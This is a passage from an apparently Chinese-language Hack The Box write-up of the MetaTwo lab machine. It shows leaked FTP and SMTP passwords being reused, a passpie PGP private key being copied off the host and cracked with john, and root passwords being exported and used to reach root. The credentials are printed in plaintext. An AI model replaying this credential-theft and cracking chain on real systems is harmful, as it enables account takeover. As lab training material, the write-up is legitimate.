+$table_prefix = &#39;wp_&#39;;
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( &#39;WP_DEBUG&#39;, false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( &#39;ABSPATH&#39; ) ) {
+        define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . &#39;wp-settings.php&#39;;
+</code></pre>
+<pre><code class="bash">define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+</code></pre>
+<p>我们得到了 ftp 的登陆账号和密码</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ftp 10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:root): metapress.htb
+331 Password required for metapress.htb
+Password: 
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||1913|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
+ftp&gt; cd mailer
+250 CWD command successful
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||27331|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
+226 Transfer complete
+ftp&gt; get send_email.php
+local: send_email.php remote: send_email.php
+229 Entering Extended Passive Mode (|||3114|)
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+100% |**********************************************************************************************************************************************************************|  1126        5.45 MiB/s    00:00 ETA
+226 Transfer complete
+1126 bytes received in 00:00 (4.08 KiB/s)
+</code></pre>
+<p>这里看到有一个 send_email.php 文件，然后下载下来了</p>
+<pre><code class="php">┌──(root㉿kali)-[~/Desktop]
+└─# cat send_email.php 
+&lt;?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+require &#39;PHPMailer/src/Exception.php&#39;;
+require &#39;PHPMailer/src/PHPMailer.php&#39;;
+require &#39;PHPMailer/src/SMTP.php&#39;;
+
+$mail = new PHPMailer(true);
+
+$mail-&gt;SMTPDebug = 3;                               
+$mail-&gt;isSMTP();            
+
+$mail-&gt;Host = &quot;mail.metapress.htb&quot;;
+$mail-&gt;SMTPAuth = true;                          
+$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 
+$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           
+$mail-&gt;SMTPSecure = &quot;tls&quot;;                           
+$mail-&gt;Port = 587;                                   
+
+$mail-&gt;From = &quot;jnelson@metapress.htb&quot;;
+$mail-&gt;FromName = &quot;James Nelson&quot;;
+
+$mail-&gt;addAddress(&quot;info@metapress.htb&quot;);
+
+$mail-&gt;isHTML(true);
+
+$mail-&gt;Subject = &quot;Startup&quot;;
+$mail-&gt;Body = &quot;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&quot;;
+
+try {
+    $mail-&gt;send();
+    echo &quot;Message has been sent successfully&quot;;
+} catch (Exception $e) {
+    echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo;
+}
+</code></pre>
+<pre><code class="bash">$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 
+$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;  
+</code></pre>
+<p>可以看到这里的账户在之前的 &#x2F;etc&#x2F;passwd 中有出现，并且是有 &#x2F;bin&#x2F;bash 权限的，这样我们就得到了一个 ssh 账户</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh jnelson@10.10.11.186
+The authenticity of host &#39;10.10.11.186 (10.10.11.186)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.186&#39; (ED25519) to the list of known hosts.
+jnelson@10.10.11.186&#39;s password: 
+Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec 31 18:52:04 2022 from 10.10.14.96
+jnelson@meta2:~$ whoami&amp;&amp;id
+jnelson
+uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
+</code></pre>
+<p>成功拿到 user 权限</p>
+<pre><code class="bash">jnelson@meta2:~$ cat user.txt 
+bfe452b37100243ff838f397eac125e9
+</code></pre>
+<p>成功拿到 user</p>
+<p>权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">jnelson@meta2:~$ ls -la
+total 32
+drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
+drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
+lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
+-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
+drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
+-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
+-rw-r----- 1 root    jnelson   33 Dec 31 19:18 user.txt
+</code></pre>
+<pre><code class="bash">jnelson@meta2:~/.passpie/ssh$ ls -la
+total 16
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..
+-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass
+-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass
+</code></pre>
+<p>在目录 &#x2F;home&#x2F;jnelson&#x2F;.passpie&#x2F;ssh 下有一个 root.pass，感觉挺有意思的，查看一下内容</p>
+<pre><code class="bash">jnelson@meta2:~/.passpie/ssh$ cat root.pass 
+comment: &#39;&#39;
+fullname: root@ssh
+login: root
+modified: 2022-06-26 08:58:15.621572
+name: ssh
+password: &#39;-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE-----
+
+  &#39;
+</code></pre>
+<p>然后还有一个 .keys 文件，但是我们没有权限访问，将它下载到本地</p>
+<pre><code class="bash">scp jnelson@10.10.11.186:.passpie/.keys keys
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# cat .keys         
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+fo6KI+w2uXLaw+bIT1XZurDN
+=dqsF
+-----END PGP PUBLIC KEY BLOCK-----
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+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
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</code></pre>
+<p>然后我删除了 .keys 中的 public 密钥</p>
+<pre><code class="bash">-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
+/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
+3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
+ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
+gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
+5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
+tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
+a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
+WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
+8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
+cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
+qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
+FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
+FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
+PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
+FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
+/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
+q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
+F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh
+S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM
+RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu
+TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20
+oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4
+V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n
+WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC
+6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB
+dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA
+OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW
+AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e
+qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi
+uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
+CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT
++PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+
+FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV
+jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G
+JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4
+VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB
+J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4
+V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
+o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</code></pre>
+<p>接着去破解 PGP 文件</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# gpg2john keys &gt; gpg.john
+
+File keys
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john   
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+blink182         (Passpie)     
+1g 0:00:00:03 DONE (2022-12-31 14:37) 0.3105g/s 50.93p/s 50.93c/s 50.93C/s ginger..blink182
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>得到了一个密码 blink182</p>
+<p>使用我们的密码去导出 passpie 的密码</p>
+<pre><code class="bash">jnelson@meta2:~/.passpie$ passpie list
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛
+jnelson@meta2:~/.passpie$ cd ../
+jnelson@meta2:~$ touch pass
+jnelson@meta2:~$ passpie export pass
+Passphrase: 
+jnelson@meta2:~$ cat pass
+credentials:
+- comment: &#39;&#39;
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;
+- comment: &#39;&#39;
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;
+handler: passpie
+version: 1.0
+</code></pre>
+<p>得到了 root 账户的密码</p>
+<pre><code class="bash">username = root
+password = p7qfAZt4_A1xo_0x
+</code></pre>
+<p>去切换到 root 用户</p>
+<pre><code class="bash">jnelson@meta2:~$ su root
+Password: 
+root@meta2:/home/jnelson# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>得到了 root 权限</p>
+<pre><code class="bash">root@meta2:/home/jnelson# cat /root/root.txt
+8af8be1e265388ed685c674d029175ca
+</code></pre>
+<p>得到了 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&title=《MetaTwo - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&title=《MetaTwo - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MetaTwo - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Precious - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">RedPanda - Hackthebox - 未做提权</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
